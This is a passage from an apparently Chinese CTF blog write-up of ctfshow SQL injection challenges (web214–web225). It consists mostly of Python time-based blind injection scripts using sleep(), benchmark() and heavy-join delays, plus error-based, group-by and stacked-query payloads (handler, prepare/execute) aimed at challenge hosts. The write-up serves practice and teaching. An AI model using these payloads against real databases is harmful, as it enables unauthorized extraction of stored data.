 mid = (head + tail) &gt;&gt; <span class="number">1</span></span><br><span class="line">        <span class="comment"># 查数据库</span></span><br><span class="line">        <span class="comment"># payload = &quot;select group_concat(table_name) from information_schema.tables where table_schema=database()&quot;</span></span><br><span class="line">        <span class="comment"># 查列名字-id.flag</span></span><br><span class="line">        <span class="comment"># payload = &quot;select group_concat(column_name) from information_schema.columns where table_name=&#x27;ctfshow_flagx&#x27;&quot;</span></span><br><span class="line">        <span class="comment"># 查数据</span></span><br><span class="line">        payload = <span class="string">&quot;select flaga from ctfshow_flagx&quot;</span></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;ip&#x27;</span>: <span class="string">f&quot;if(ascii(substr((<span class="subst">&#123;payload&#125;</span>),<span class="subst">&#123;i&#125;</span>,1))&gt;<span class="subst">&#123;mid&#125;</span>,sleep(1),1)&quot;</span>,</span><br><span class="line">            <span class="string">&#x27;debug&#x27;</span>:<span class="string">&#x27;0&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            r = requests.post(url, data=data, timeout=<span class="number">1</span>)</span><br><span class="line">            tail = mid</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            head = mid + <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> head != <span class="number">32</span>:</span><br><span class="line">        result += <span class="built_in">chr</span>(head)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(result)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="web215"><a href="#web215" class="headerlink" title="web215"></a>web215</h1><h2 id="过滤单引号时间盲注"><a href="#过滤单引号时间盲注" class="headerlink" title="过滤单引号时间盲注"></a>过滤单引号时间盲注</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Author:Y4tacker</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://4ba8a766-0fda-4c66-bdbc-0e3f0a9d57dc.chall.ctf.show/api/&quot;</span></span><br><span class="line"></span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    i = i + <span class="number">1</span></span><br><span class="line">    head = <span class="number">32</span></span><br><span class="line">    tail = <span class="number">127</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> head &lt; tail:</span><br><span class="line">        mid = (head + tail) &gt;&gt; <span class="number">1</span></span><br><span class="line">        <span class="comment"># 查数据库</span></span><br><span class="line">        <span class="comment"># payload = &quot;select group_concat(table_name) from information_schema.tables where table_schema=database()&quot;</span></span><br><span class="line">        <span class="comment"># 查列名字-id.flag</span></span><br><span class="line">        <span class="comment"># payload = &quot;select group_concat(column_name) from information_schema.columns where table_name=&#x27;ctfshow_flagxc&#x27;&quot;</span></span><br><span class="line">        <span class="comment"># 查数据</span></span><br><span class="line">        payload = <span class="string">&quot;select flagaa from ctfshow_flagxc&quot;</span></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;ip&#x27;</span>: <span class="string">f&quot;1&#x27; or if(ascii(substr((<span class="subst">&#123;payload&#125;</span>),<span class="subst">&#123;i&#125;</span>,1))&gt;<span class="subst">&#123;mid&#125;</span>,sleep(1),1) and &#x27;1&#x27;=&#x27;1&quot;</span>,</span><br><span class="line">            <span class="string">&#x27;debug&#x27;</span>:<span class="string">&#x27;0&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            r = requests.post(url, data=data, timeout=<span class="number">1</span>)</span><br><span class="line">            tail = mid</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            head = mid + <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> head != <span class="number">32</span>:</span><br><span class="line">        result += <span class="built_in">chr</span>(head)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(result)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="web216"><a href="#web216" class="headerlink" title="web216"></a>web216</h1><h2 id="base64解码id"><a href="#base64解码id" class="headerlink" title="base64解码id"></a>base64解码id</h2><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220408124221533.png" alt="image-20220408124221533"></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Author:Y4tacker</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://0f3060ee-be00-4090-a8e7-fc0944779c24.chall.ctf.show/api/&quot;</span></span><br><span class="line"></span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    i = i + <span class="number">1</span></span><br><span class="line">    head = <span class="number">32</span></span><br><span class="line">    tail = <span class="number">127</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> head &lt; tail:</span><br><span class="line">        mid = (head + tail) &gt;&gt; <span class="number">1</span></span><br><span class="line">        <span class="comment"># 查数据库</span></span><br><span class="line">        <span class="comment"># payload = &quot;select group_concat(table_name) from information_schema.tables where table_schema=database()&quot;</span></span><br><span class="line">        <span class="comment"># 查列名字-id.flag</span></span><br><span class="line">        <span class="comment"># payload = &quot;select group_concat(column_name) from information_schema.columns where table_name=&#x27;ctfshow_flagxcc&#x27;&quot;</span></span><br><span class="line">        <span class="comment"># 查数据</span></span><br><span class="line">        payload = <span class="string">&quot;select flagaac from ctfshow_flagxcc&quot;</span></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;ip&#x27;</span>: <span class="string">f&quot;&#x27;MQ==&#x27;) or if (ascii(substr((<span class="subst">&#123;payload&#125;</span>),<span class="subst">&#123;i&#125;</span>,1))&gt;<span class="subst">&#123;mid&#125;</span>,sleep(1),1&quot;</span>,</span><br><span class="line">            <span class="string">&#x27;debug&#x27;</span>:<span class="string">&#x27;0&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            r = requests.post(url, data=data, timeout=<span class="number">1</span>)</span><br><span class="line">            tail = mid</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            head = mid + <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> head != <span class="number">32</span>:</span><br><span class="line">        result += <span class="built_in">chr</span>(head)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(result)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="web217"><a href="#web217" class="headerlink" title="web217"></a>web217</h1><h2 id="benchmark-时间盲注"><a href="#benchmark-时间盲注" class="headerlink" title="benchmark()时间盲注"></a>benchmark()时间盲注</h2><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220408132254910.png" alt="image-20220408132254910"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">benchmark(t,exp)</span><br><span class="line">    select benchmark(count,expr),是重复执行count次expr表达式，使得处理时间很长，来产生延迟，</span><br><span class="line">    比如select benchmark(1000000,encode(&quot;hello&quot;,&quot;good&quot;));</span><br><span class="line">    select benchmark( 5000000, md5( &#x27;test&#x27; ));</span><br></pre></td></tr></table></figure><p>判断</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&quot;http://9b2612c9-bd0f-4733-9729-1efec72f21f9.challenge.ctf.show/api/&quot;</span></span><br><span class="line"><span class="comment">#payload = &quot;length(database())=0&quot; #没延迟</span></span><br><span class="line">payload = <span class="string">&quot;length(database())&gt;0&quot;</span> <span class="comment">#延迟</span></span><br><span class="line">date = &#123;</span><br><span class="line">    <span class="string">&#x27;ip&#x27;</span>: <span class="string">f&quot;1) or if((<span class="subst">&#123;payload&#125;</span>),benchmark(3480500,sha(1)),1)#&quot;</span>,</span><br><span class="line">    <span class="string">&#x27;debug&#x27;</span>: <span class="string">&quot;0&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    r = requests.post(url, data=date, timeout=<span class="number">1</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;没延迟&#x27;</span>)</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;延迟&#x27;</span>)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://bc98f2a3-911d-4606-9d0e-e277bf086bdf.challenge.ctf.show/api/&quot;</span></span><br><span class="line"></span><br><span class="line">ans = <span class="string">&quot;&quot;</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    i += <span class="number">1</span></span><br><span class="line">    head = <span class="number">32</span></span><br><span class="line">    tail = <span class="number">127</span></span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> head &lt; tail:</span><br><span class="line">        j += <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> j / <span class="number">2</span> == <span class="number">1</span>: <span class="comment">#算两个让数据库歇一会,不然数据库还没算完,就算下一个会有误差</span></span><br><span class="line">            time.sleep(<span class="number">2</span>)</span><br><span class="line">        mid = (head + tail) &gt;&gt; <span class="number">1</span></span><br><span class="line">        <span class="comment">#表名 ctfshow_flagxccb</span></span><br><span class="line">        <span class="comment">#payload = &quot;select group_concat(table_name) from information_schema.tables where table_schema=database()&quot;</span></span><br><span class="line">        <span class="comment">#字段名 flagaabc</span></span><br><span class="line">        <span class="comment">#payload = &quot;select group_concat(column_name) from information_schema.columns where table_name=&#x27;ctfshow_flagxccb&#x27;&quot;</span></span><br><span class="line">        <span class="comment"># 数据 防止查错咱们多等会呗,可用改改benchmark的循环次数,我改到7400000</span></span><br><span class="line">        payload = <span class="string">&quot;select flagaabc from ctfshow_flagxccb&quot;</span></span><br><span class="line"></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;ip&#x27;</span> :<span class="string">f&quot;1) or if((ascii(substr((<span class="subst">&#123;payload&#125;</span>),<span class="subst">&#123;i&#125;</span>,1)))&gt;<span class="subst">&#123;mid&#125;</span>,benchmark(3480500,sha(1)),1&quot;</span>,</span><br><span class="line">            <span class="string">&#x27;debug&#x27;</span> : <span class="string">&#x27;0&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            r = requests.post(url , data= data ,timeout=<span class="number">1</span>)</span><br><span class="line">            <span class="comment">#time.sleep(0.3)</span></span><br><span class="line">            tail = mid</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            head = mid +<span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> head != <span class="number">32</span>:</span><br><span class="line">        ans += <span class="built_in">chr</span>(head)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(ans)</span><br></pre></td></tr></table></figure><p><a href="https://www.cnblogs.com/forforever/p/13019703.html">MySQL时间盲注五种延时方法</a></p><h1 id="web218"><a href="#web218" class="headerlink" title="web218"></a>web218</h1><h2 id="多表联合查询时间盲注"><a href="#多表联合查询时间盲注" class="headerlink" title="多表联合查询时间盲注"></a>多表联合查询时间盲注</h2><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220408142736722.png" alt="image-20220408142736722"></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://8121f42d-c9da-4307-94b0-c7345a92f907.challenge.ctf.show/api/&quot;</span></span><br><span class="line"></span><br><span class="line">ans = <span class="string">&quot;&quot;</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    i += <span class="number">1</span></span><br><span class="line">    head = <span class="number">32</span></span><br><span class="line">    tail = <span class="number">127</span></span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> head &lt; tail:</span><br><span class="line">        j += <span class="number">1</span></span><br><span class="line">        <span class="comment">#算两个让数据库歇一会,不然数据库还没算完,就算下一个会有误差</span></span><br><span class="line">        time.sleep(<span class="number">6</span>)</span><br><span class="line">        mid = (head + tail) &gt;&gt; <span class="number">1</span></span><br><span class="line">        <span class="comment">#表名 ctfshow_flagxc</span></span><br><span class="line">        <span class="comment">#payload = &quot;select group_concat(table_name) from information_schema.tables where table_schema=database()&quot;</span></span><br><span class="line">        <span class="comment">#字段名 flagaabc</span></span><br><span class="line">        <span class="comment">#payload = &quot;select group_concat(column_name) from information_schema.columns where table_name=&#x27;ctfshow_flagxc&#x27;&quot;</span></span><br><span class="line">        <span class="comment"># 数据 防止查错咱们多等会呗 我直接就查一个</span></span><br><span class="line">        payload = <span class="string">&quot;select flagaac from ctfshow_flagxc&quot;</span></span><br><span class="line">        <span class="comment">#ctfshow&#123;2d33427a-d593-4d42-85a2-a459a676b1b0&#125;</span></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;ip&#x27;</span> :<span class="string">f&quot;1) or if((ascii(substr((<span class="subst">&#123;payload&#125;</span>),<span class="subst">&#123;i&#125;</span>,1)))&gt;<span class="subst">&#123;mid&#125;</span>,(SELECT count(*) FROM information_schema.columns A, information_schema.schemata B, information_schema.schemata C, information_schema.schemata D,information_schema.schemata F,information_schema.schemata H),1&quot;</span>,</span><br><span class="line">            <span class="string">&#x27;debug&#x27;</span> : <span class="string">&#x27;0&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            r = requests.post(url , data= data ,timeout=<span class="number">1</span>)</span><br><span class="line">            <span class="comment">#time.sleep(0.3)</span></span><br><span class="line">            tail = mid</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            head = mid +<span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> head != <span class="number">32</span>:</span><br><span class="line">        ans += <span class="built_in">chr</span>(head)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(ans)</span><br></pre></td></tr></table></figure><h1 id="web219"><a href="#web219" class="headerlink" title="web219"></a>web219</h1><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220408172145807.png" alt="image-20220408172145807"></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://51762119-b7e0-4b2a-a392-0f5fded552ac.challenge.ctf.show/api/&quot;</span></span><br><span class="line"></span><br><span class="line">ans = <span class="string">&quot;&quot;</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    i += <span class="number">1</span></span><br><span class="line">    head = <span class="number">32</span></span><br><span class="line">    tail = <span class="number">127</span></span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> head &lt; tail:</span><br><span class="line">        j += <span class="number">1</span></span><br><span class="line">        <span class="comment">#算两个让数据库歇一会,不然数据库还没算完,就算下一个会有误差</span></span><br><span class="line"></span><br><span class="line">        mid = (head + tail) &gt;&gt; <span class="number">1</span></span><br><span class="line">        <span class="comment">#表名 ctfshow_flagxca</span></span><br><span class="line">        <span class="comment">#payload = &quot;select group_concat(table_name) from information_schema.tables where table_schema=database()&quot;</span></span><br><span class="line">        <span class="comment">#字段名 flagaabc</span></span><br><span class="line">        <span class="comment">#payload = &quot;select group_concat(column_name) from information_schema.columns where table_name=&#x27;ctfshow_flagxca&#x27;&quot;</span></span><br><span class="line">        <span class="comment"># 数据 防止查错咱们多等会呗 我直接就查一个</span></span><br><span class="line">        payload = <span class="string">&quot;select flagaabc from ctfshow_flagxca&quot;</span></span><br><span class="line">        <span class="comment">#ctfshow&#123;96c90aaa-5a9f-48bf-9ff0-814874d503f1&#125;</span></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;ip&#x27;</span> :<span class="string">f&quot;1) or if((ascii(substr((<span class="subst">&#123;payload&#125;</span>),<span class="subst">&#123;i&#125;</span>,1)))&gt;<span class="subst">&#123;mid&#125;</span>,1,(SELECT count(*) FROM information_schema.columns A, information_schema.schemata B, information_schema.schemata C, information_schema.schemata D,information_schema.schemata F,information_schema.schemata H)&quot;</span>,</span><br><span class="line">            <span class="string">&#x27;debug&#x27;</span> : <span class="string">&#x27;0&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            r = requests.post(url , data= data ,timeout=<span class="number">1</span>)</span><br><span class="line">            <span class="comment">#time.sleep(0.3)</span></span><br><span class="line">            head = mid +<span class="number">1</span></span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            tail = mid</span><br><span class="line">            time.sleep(<span class="number">6</span>)</span><br><span class="line">    <span class="keyword">if</span> head != <span class="number">32</span>:</span><br><span class="line">        ans += <span class="built_in">chr</span>(head)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(ans)</span><br></pre></td></tr></table></figure><h1 id="web220"><a href="#web220" class="headerlink" title="web220"></a>web220</h1><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220408184439334.png" alt="image-20220408184439334"></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://51762119-b7e0-4b2a-a392-0f5fded552ac.challenge.ctf.show/api/&quot;</span></span><br><span class="line">ans = <span class="string">&quot;&quot;</span></span><br><span class="line">j = <span class="number">1</span></span><br><span class="line"><span class="built_in">dir</span> = <span class="string">&quot;cfi_1234567890&#123;&#125;-qazwsxedcrfvtgbyhnujmikolpQWERTYUIOPASDFGHJKLZXCVBNM&quot;</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">dir</span>:</span><br><span class="line">        ans += i</span><br><span class="line"></span><br><span class="line">        <span class="comment">#表名 ctfshow_flagxcac</span></span><br><span class="line">        <span class="comment">#payload = &quot;select table_name from information_schema.tables where table_schema=database() limit 0,1&quot;</span></span><br><span class="line">        <span class="comment">#字段名 ctfshow_flagxcac</span></span><br><span class="line">        payload = <span class="string">&quot;select column_name from information_schema.columns where table_name=&#x27;ctfshow_flagxcac&#x27; limit 1,1&quot;</span></span><br><span class="line">        <span class="comment"># 数据 防止查错咱们多等会呗 我直接就查一个</span></span><br><span class="line">        payload = <span class="string">&quot;select flagaabcc from ctfshow_flagxcac&quot;</span></span><br><span class="line">        <span class="comment">#ctfshow&#123;96c90aaa-5a9f-48bf-9ff0-814874d503f1&#125;</span></span><br><span class="line">        <span class="comment">#print(f&quot;if(ord(left(&#123;payload&#125;,&#123;i&#125;))&gt;&#123;mid&#125;,1,(SELECT count(*) FROM information_schema.columns A, information_schema.schemata B, information_schema.schemata C, information_schema.schemata D,information_schema.schemata F,information_schema.schemata H)&quot;)</span></span><br><span class="line"></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;ip&#x27;</span> :<span class="string">f&quot;1) or if((left((<span class="subst">&#123;payload&#125;</span>),<span class="subst">&#123;j&#125;</span>))=&#x27;<span class="subst">&#123;ans&#125;</span>&#x27;,(SELECT count(*) FROM information_schema.columns A, information_schema.schemata B, information_schema.schemata C, information_schema.schemata D,information_schema.schemata F,information_schema.schemata H),1&quot;</span>,</span><br><span class="line">            <span class="string">&#x27;debug&#x27;</span> : <span class="string">&#x27;0&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            r = requests.post(url , data= data ,timeout=<span class="number">1</span>)</span><br><span class="line">            <span class="comment">#time.sleep(0.3)</span></span><br><span class="line">            ans = ans[:-<span class="number">1</span>]</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;正确&#x27;</span>)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(ans)</span><br><span class="line">            j += <span class="number">1</span></span><br><span class="line">            time.sleep(<span class="number">6</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;错误&#x27;</span>)</span><br></pre></td></tr></table></figure><h1 id="web221"><a href="#web221" class="headerlink" title="web221"></a>web221</h1><h2 id="limit报错注入"><a href="#limit报错注入" class="headerlink" title="limit报错注入"></a>limit报错注入</h2><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220408211002396.png" alt="image-20220408211002396"></p><p>mysql利用procedure analyse()函数优化表的结构</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220408211135617.png" alt="image-20220408211135617"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/api/?page=1&amp;limit=10  procedure analyse(extractvalue(rand(),concat(0x3a,database())),2)</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220408212617134.png" alt="image-20220408212617134"></p><p>直接提交这个数据库哦</p><p>还有这个</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/api/?page=1&amp;limit=10  procedure analyse((updatexml(1,concat(0x7e,database(),0x7e),1)),2)</span><br></pre></td></tr></table></figure><h1 id="web222"><a href="#web222" class="headerlink" title="web222"></a>web222</h1><h2 id="group-by-注入"><a href="#group-by-注入" class="headerlink" title="group by 注入"></a>group by 注入</h2><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220408213246662.png" alt="image-20220408213246662"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from ctfshow_user group by 1,if(1=1,sleep(1),1);</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure><h1 id="web223"><a href="#web223" class="headerlink" title="web223"></a>web223</h1><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220408214846588.png" alt="image-20220408214846588"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220408215003341.png" alt="image-20220408215003341"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220408215023841.png" alt="image-20220408215023841"></p><p>显然可以盲注</p><p>数字被禁了可以使用true绕过</p><h1 id="web224"><a href="#web224" class="headerlink" title="web224"></a>web224</h1><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220408220113624.png" alt="image-20220408220113624"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220408220136403.png" alt="image-20220408220136403"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220408220153265.png" alt="image-20220408220153265"></p><p>重置成admin admin登录一下</p><h1 id="web225"><a href="#web225" class="headerlink" title="web225"></a>web225</h1><h2 id="堆叠注入-handler读数据"><a href="#堆叠注入-handler读数据" class="headerlink" title="堆叠注入 handler读数据"></a>堆叠注入 handler读数据</h2><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220408221302428.png" alt="image-20220408221302428"></p><p>没有过滤show</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/api/?username=1&#x27;;show databases;&amp;page=1&amp;limit=10</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220408221705966.png" alt="image-20220408221705966"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/api/?username=1&#x27;;show tables;&amp;page=1&amp;limit=10</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220408221725973.png" alt="image-20220408221725973"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/api/?username=1&#x27;;show tables;handler ctfshow_flagasa open;handler ctfshow_flagasa read first;handler ctfshow_flagasa close;&amp;page=1&amp;limit=10</span><br></pre></td></tr></table></figure><p>预处理</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/api/?username=1&#x27;;SET @sqli=concat(char(115,101,108,101,99,116),&#x27; database()&#x27;);PREPARE st from @sqli;EXECUTE st;&amp;page=1&amp;limit=10</span><br></pre></td></tr></table></figure><h2 id="预处理"><a href="#预处理" class="headerlink" title="预处理"></a>预处理</h2><h3 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h3><p>mysql将prepare execute deallocate统称为 PREPARE STATEMENT.</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PREPARE name from &#x27;[my sql sequece]&#x27;;#预定义sql语句</span><br><span class="line">EXECUTE name; #执行预定义的sql语句</span><br><span class="line">(DEALLOCATE || DROP) PREPARE name; #珊瑚预定义sql语句 </span><br></pre></td></tr></table></figure><p>字符串定义预处理</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PREPARE stmt1 FROM &#x27;SELECT SQRT(POW(?,2) + POW(?,2)) AS hypotenuse&#x27;;</span><br><span class="line">ET @a = 3;</span><br><span class="line">SET @b = 4;</span><br><span class="line">EXECUTE stmt1 USING @a, @b;</span><br></pre></td></tr></table></figure><p>变量定义预处理sql</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SET @s = &quot;SELECT SQRT(POW(?,2) + POW (?,2)) AS hypotenuse&quot;;</span><br><span class="line">PREPARE stmt2 FROM @s;</span><br><span class="line">SET @c = 6;</span><br><span class="line">ET @d = 8;</span><br><span class="line">EXECUTE stmt2 USING @c,@d;</span><br><span class="line">DEALLOCATE PREPARE stmt2;</span><br></pre></td></tr></table></figure><h3 id="常规堆叠注入"><a href="#常规堆叠注入" class="headerlink" title="常规堆叠注入"></a>常规堆叠注入</h3><p>习惯扫目录,没扫到</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203151506062.png" alt="image-20220315150640013"></p><p>输入单引号,报错得出数据库mariadb </p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; or 1=1#回显正常</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203151507620.png" alt="image-20220315150758543"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; order by 3#报错</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203151510055.png" alt="image-20220315151004003"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; order by 2#正常</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203151510359.png" alt="image-20220315151033307"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1&#x27; union select 1,2#发现有过滤</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203151511268.png" alt="image-20220315151126218"></p><p>大小写也绕不过</p><p>那么只能堆叠注入了</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;;show databases;#</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203151513103.png" alt="image-20220315151331036"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">11&#x27;;show tables;#</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203151514104.png" alt="image-20220315151416056"></p><p>这里查看一个flag在那个字段里</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;;desc `1919810931114514`;#</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203151516959.png" alt="image-20220315151658903"></p><p>查一下下一个</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;;desc `words`;# 这里也可以不加`` </span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203151519393.png" alt="image-20220315151902329"></p><p>那么这里面的id就有可能是我们查询时输入的值了,他的查询语句就可能是</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select id,data from words where 